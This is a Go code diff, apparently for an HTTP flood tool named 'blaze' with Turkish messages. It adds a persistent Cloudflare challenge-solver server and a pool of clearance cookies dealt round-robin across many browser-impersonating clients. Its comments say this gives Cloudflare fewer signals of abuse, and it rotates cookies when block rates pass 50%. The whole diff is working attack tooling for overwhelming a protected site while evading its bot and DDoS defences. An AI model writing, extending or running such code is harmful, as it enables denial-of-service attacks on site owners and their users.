@@ -2,11 +2,9 @@ package main
 
 import (
 	"context"
-	"encoding/json"
 	"fmt"
 	"net/http"
 	"os"
-	"os/exec"
 	"os/signal"
 	"runtime"
 	"strconv"
@@ -69,70 +67,71 @@ func main() {
 
 	var solvedCookies string
 	var solvedUA string
+	var solverSrv *SolverServer
+	var cookiePool *CookiePool
 	if solve {
 		var err error
-		solvedCookies, solvedUA, err = solveCFChallenge(targetURL)
+		solverSrv, cookiePool, solvedCookies, solvedUA, err = startSolver(targetURL)
 		if err != nil {
 			fmt.Fprintf(os.Stderr, "%shata: challenge cozulemedi: %v%s\n", red, err, reset)
 			os.Exit(1)
 		}
+		defer solverSrv.Stop()
 	}
 
-	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve)
+	run(targetURL, durSec, threads, streams, method, proxyArg, solvedCookies, solvedUA, solve, cookiePool)
 }
 
-type solverResult struct {
-	Status    string `json:"status"`
-	URL       string `json:"url"`
-	UserAgent string `json:"user_agent"`
-	Cookies   string `json:"cookies"`
-	Error     string `json:"error"`
-}
+// startSolver brings up the persistent solver server, fills a cookie pool,
+// captures the solver browser's TLS fingerprint, and returns the first
+// cookie set so blaze can seed its initial templates.
+func startSolver(targetURL string) (*SolverServer, *CookiePool, string, string, error) {
+	const poolSize = 5
 
-func solveCFChallenge(targetURL string) (cookies string, userAgent string, err error) {
-	fmt.Printf("cloudflare challenge cozuluyor...\n")
-
-	solverPath := findSolver()
-	if solverPath == "" {
-		return "", "", fmt.Errorf("solver/index.js bulunamadi")
-	}
-	if _, errStat := os.Stat("solver/node_modules"); os.IsNotExist(errStat) {
-		return "", "", fmt.Errorf("solver/node_modules bulunamadi")
+	srv := newSolverServer(targetURL, poolSize, 9876)
+	fmt.Printf("solver server baslatiliyor (havuz=%d)...\n", poolSize)
+	if err := srv.Start(poolSize); err != nil {
+		return nil, nil, "", "", err
 	}
 
-	ctx, cancel := context.WithTimeout(context.Background(), 60*time.Second)
+	// At least 1 healthy slot is enough to start; we wait up to 2 minutes for
+	// the full pool but proceed as soon as we have one usable cookie.
+	ctx, cancel := context.WithTimeout(context.Background(), 2*time.Minute)
 	defer cancel()
+	healthy, err := srv.WaitPoolReady(ctx, 1, 2*time.Minute)
+	if err != nil {
+		srv.Stop()
+		return nil, nil, "", "", err
+	}
+	fmt.Printf("%shavuz hazir: %d slot saglikli%s\n", white, healthy, reset)
 
-	cmd := exec.CommandContext(ctx, "node", solverPath, targetURL, "45")
-	cmd.Stderr = os.Stderr
-	output, errCmd := cmd.Output()
-	if errCmd != nil {
-		return "", "", fmt.Errorf("solver calistirilamadi: %w", errCmd)
+	// Try to capture the solver browser's actual TLS fingerprint so the user
+	// can compare it with the gofire client's emulated JA4. UAM binds
+	// cf_clearance to JA4 + UA; any drift causes "all mitigated".
+	if fp, err := srv.Fingerprint(ctx); err == nil && fp != nil {
+		fmt.Printf("%ssolver fingerprint: ja4=%s ja3=%s ua_tail=%s%s\n",
+			gray, fp.JA4, fp.JA3Hash, lastWord(fp.UserAgent), reset)
 	}
 
-	var result solverResult
-	if errJSON := json.Unmarshal(output, &result); errJSON != nil {
-		return "", "", fmt.Errorf("solver ciktisi okunamadi: %w", errJSON)
+	// Populate the local cookie pool. Aim for poolSize but accept fewer.
+	pool := newCookiePool(srv)
+	got := pool.Fill(ctx, poolSize)
+	if got == 0 {
+		srv.Stop()
+		return nil, nil, "", "", fmt.Errorf("solver havuzdan hic cookie alinamadi")
 	}
+	fmt.Printf("%scookie havuzu: %d adet hazir%s\n", white, got, reset)
 
-	if result.Status == "error" {
-		return "", "", fmt.Errorf("%s", result.Error)
-	}
-	if result.Cookies == "" {
-		return "", "", fmt.Errorf("cookie yok (status: %s)", result.Status)
-	}
-
-	fmt.Printf("%schallenge cozuldu!%s\n", white, reset)
-	return result.Cookies, result.UserAgent, nil
+	first := pool.Snapshot()[0]
+	return srv, pool, first.Cookies, first.UserAgent, nil
 }
 
-func findSolver() string {
-	for _, p := range []string{"solver/index.js", "./solver/index.js"} {
-		if _, err := os.Stat(p); err == nil {
-			return p
-		}
+func lastWord(s string) string {
+	parts := strings.Fields(s)
+	if len(parts) == 0 {
+		return ""
 	}
-	return ""
+	return parts[len(parts)-1]
 }
 
 type clientGroup struct {
@@ -172,7 +171,7 @@ func (cg *clientGroup) updateCookies(newCookies string) {
 
 // browserLabel maps tag to full display name
 var browserLabel = map[string]string{
-	"Ch": "Chrome 146",
+	"Ch": "Chrome 147",
 	"FF": "Firefox 150",
 	"SF": "Safari iOS 18",
 }
@@ -205,7 +204,7 @@ func formatTestResult(tag string, statusCode int, err error) string {
 	return fmt.Sprintf("%sImpersonate %s %s>%s %s%d%s", white, label, gray, reset, white, statusCode, reset)
 }
 
-func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool) {
+func run(targetURL string, durSec, threads, streams int, method, proxyArg, solvedCookies, solvedUA string, solveEnabled bool, cookiePool *CookiePool) {
 	runtime.GOMAXPROCS(runtime.NumCPU())
 
 	totalTargetClients := threads
@@ -274,7 +273,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 
 	if solvedCookies != "" {
 		browsers = []browserSpec{
-			{"chrome", "Ch", gofire.Chrome146, totalTargetClients},
+			{"chrome", "Ch", gofire.Chrome147, totalTargetClients},
 		}
 		if solvedUA != "" {
 			baseOpts = append(baseOpts, gofire.WithUserAgent(solvedUA))
@@ -294,7 +293,7 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 		browsers = []browserSpec{
 			{"firefox", "FF", gofire.Firefox150, firefoxClients},
-			{"chrome", "Ch", gofire.Chrome146, chromeClients},
+			{"chrome", "Ch", gofire.Chrome147, chromeClients},
 			{"safari", "SF", gofire.SafariIOS18, safariClients},
 		}
 	}
@@ -314,6 +313,15 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		cg := &clientGroup{name: bs.name, tag: bs.tag}
 		opts := append(baseOpts, gofire.WithReferer(browserReferers[bs.name]))
 
+		// Snapshot the cookie pool once so we can deal cookies round-robin
+		// across this group's clients. With pool=5 and clients=10 each
+		// cookie is shared by ~2 clients, spreading load and giving CF
+		// fewer "this single cookie is being abused" signals to weight on.
+		var poolCookies []SolverCookie
+		if cookiePool != nil {
+			poolCookies = cookiePool.Snapshot()
+		}
+
 		for i := 0; i < bs.clients; i++ {
 			c, err := gofire.Emulate(bs.profile, opts...)
 			if err != nil {
@@ -331,8 +339,14 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 				fmt.Fprintf(os.Stderr, "%shata: template olusturulamadi: %v%s\n", red, err, reset)
 				os.Exit(1)
 			}
-			if solvedCookies != "" {
-				tmpl.Header.Set("Cookie", solvedCookies)
+			// Per-client cookie assignment: round-robin across the pool so
+			// distinct clients carry distinct cf_clearance values.
+			cookieForClient := solvedCookies
+			if len(poolCookies) > 0 {
+				cookieForClient = poolCookies[i%len(poolCookies)].Cookies
+			}
+			if cookieForClient != "" {
+				tmpl.Header.Set("Cookie", cookieForClient)
 			}
 			p := c.NewPipeline(workersPerClient)
 			p.SetTemplate(tmpl)
@@ -449,8 +463,11 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 		}
 	}
 
-	// Auto-refresh (silent unless refreshing)
-	if solveEnabled {
+	// Auto-refresh: when 403/503 rate spikes, rotate every group's cookie
+	// to a fresh one from the local CookiePool. The pool itself is fed by
+	// the solver server in the background, so this is a cheap O(groups)
+	// pointer swap rather than a multi-second browser solve.
+	if solveEnabled && cookiePool != nil {
 		go func() {
 			ticker := time.NewTicker(5 * time.Second)
 			defer ticker.Stop()
@@ -468,20 +485,23 @@ func run(targetURL string, durSec, threads, streams int, method, proxyArg, solve
 						continue
 					}
 					rate := float64(count403) / float64(total)
-					if rate < 0.80 {
+					if rate < 0.50 {
 						continue
 					}
 					if !refreshing.CompareAndSwap(false, true) {
 						continue
 					}
 
-					newCookies, _, errSolve := solveCFChallenge(targetURL)
-					if errSolve != nil {
+					// Pick a fresh cookie from the pool. If pool is empty,
+					// fall back to telling solver to rebuild and try again
+					// next tick.
+					pc := cookiePool.Pick()
+					if pc == nil {
 						refreshing.Store(false)
 						continue
 					}
 					for _, cg := range groups {
-						cg.updateCookies(newCookies)
+						cg.updateCookies(pc.cookies)
 					}
 					refreshing.Store(false)
 				}
